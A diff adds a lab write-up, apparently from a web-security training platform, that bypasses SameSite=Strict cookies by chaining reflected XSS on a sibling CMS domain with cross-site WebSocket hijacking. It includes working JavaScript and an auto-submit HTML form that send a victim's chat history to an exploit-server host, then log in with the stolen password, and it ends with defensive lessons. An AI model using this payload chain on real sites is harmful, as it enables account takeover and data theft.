@@ -1,0 +1,112 @@
+================================
+LAB: SameSite Strict bypass via sibling domain
+================================
+
+[LAB INFORMATION]
+-----------------
+Date: 2026-02-11
+Lab URL: https://0a0200d1034484708145fc57004a00bc.web-security-academy.net
+Category: CSRF / Cross-Site WebSocket Hijacking
+Level: Practitioner
+Objective: Exploit CSWSH to exfiltrate victim's chat history and login to their account
+Description: Live chat feature vulnerable to cross-site WebSocket hijacking. SameSite=Strict cookies in use, but sibling domain (CMS) contains XSS vulnerability enabling same-site attack.
+
+[RECONNAISSANCE]
+----------------
+Main domain analysis:
+- /chat endpoint uses WebSocket (wss://[domain]/chat)
+- Pattern: connection opens → send "READY" → server returns chat history
+- JavaScript file (/resources/js/chat.js) contains WebSocket handling code
+- CORS header reveals sibling domain: Access-Control-Allow-Origin: https://cms-[domain]
+
+Cookie configuration:
+- session cookie has SameSite=Strict flag
+- Blocks cross-site requests from attacker's domain
+- Does NOT block same-site requests between subdomains sharing same eTLD+1
+
+Sibling domain discovery:
+- cms-[domain].web-security-academy.net exists
+- Same site as main domain (same eTLD+1)
+- Login form at /login endpoint
+
+[VULNERABILITY DISCOVERY]
+-------------------------
+Two vulnerabilities chained together:
+
+1. Reflected XSS in CMS /login endpoint
+   - username parameter reflected unsanitized in error message: "Invalid username: [INPUT]"
+   - No HTML encoding or sanitization
+   - Payload: <script>prompt()</script> executes
+
+2. Cross-Site WebSocket Hijacking on main domain
+   - WebSocket handshake does not validate Origin header
+   - Relies solely on session cookie for authentication
+   - No CSRF token on WebSocket connection
+
+SameSite=Strict bypass:
+- CMS and main domain are same-site (same eTLD+1)
+- JavaScript executed from CMS can open WebSocket to main domain
+- Browser sends cookies in same-site context
+
+[EXPLOITATION]
+--------------
+Attack chain: Exploit Server → Auto-submit POST → CMS XSS → WebSocket → Exfiltration
+
+Step 1: WebSocket exfiltration payload
+```javascript
+<script>
+var ws=new WebSocket('wss://0a0200d1034484708145fc57004a00bc.web-security-academy.net/chat');
+ws.onopen=function(){ws.send('READY');};
+ws.onmessage=function(e){fetch('https://exploit-0adc00b2038684f981f4fb39016600b3.exploit-server.net/?msg='+btoa(e.data));};
+</script>
+```
+
+Step 2: HTML page on exploit server (auto-submit form to inject XSS)
+```html
+<html>
+<body>
+<form id="xss" method="POST" action="https://cms-0a0200d1034484708145fc57004a00bc.web-security-academy.net/login">
+<input type="hidden" name="username" value="<script>var ws=new WebSocket('wss://0a0200d1034484708145fc57004a00bc.web-security-academy.net/chat');ws.onopen=function(){ws.send('READY');};ws.onmessage=function(e){fetch('https://exploit-0adc00b2038684f981f4fb39016600b3.exploit-server.net/?msg='+btoa(e.data));};</script>">
+<input type="hidden" name="password" value="test">
+</form>
+<script>document.getElementById('xss').submit();</script>
+</body>
+</html>
+```
+
+Step 3: Deliver to victim
+- Victim's browser submits form to CMS /login
+- XSS triggers, executes from CMS domain (same-site context)
+- WebSocket opens to main domain with victim's session cookie
+- "READY" sent, chat history returned
+- Each message base64-encoded and exfiltrated to exploit server logs
+
+Step 4: Decode exfiltrated data
+```
+Message 4 (decoded): {"user":"Hal Pline","content":"No problem carlos, it's kg3gjd3llj625aiyi0n2"}
+```
+
+Step 5: Login as carlos
+- Username: carlos
+- Password: kg3gjd3llj625aiyi0n2
+- Lab solved
+
+[EVIDENCE]
+----------
+Exploit server access logs showing exfiltration:
+```
+10.0.3.132  2026-02-11 16:36:22 +0000 "GET /?msg=eyJ1c2VyIjoiSGFsIFBsaW5lIiwiY29udGVudCI6Ik5vIHByb2JsZW0gY2FybG9zLCBpdCZhcG9zO3Mga2czZ2pkM2xsajYyNWFpeWkwbjIifQ==" 200
+```
+
+Decoded: Hal Pline reveals carlos's password in plain text.
+
+Successful login to victim account confirmed lab completion.
+
+[LESSONS LEARNED]
+-----------------
+- SameSite=Strict is NOT sufficient protection when sibling domains exist with vulnerabilities
+- Same-site includes all subdomains sharing the same eTLD+1 (example.com = cms.example.com = shop.example.com)
+- WebSocket handshake must validate Origin header, not just rely on cookies
+- Reflected XSS on any same-site domain breaks CSRF protections entirely
+- Defense in depth: CSRF tokens on WebSocket connections + Origin validation + sanitize all reflected input
+- Never store sensitive data (credentials) in chat history without encryption
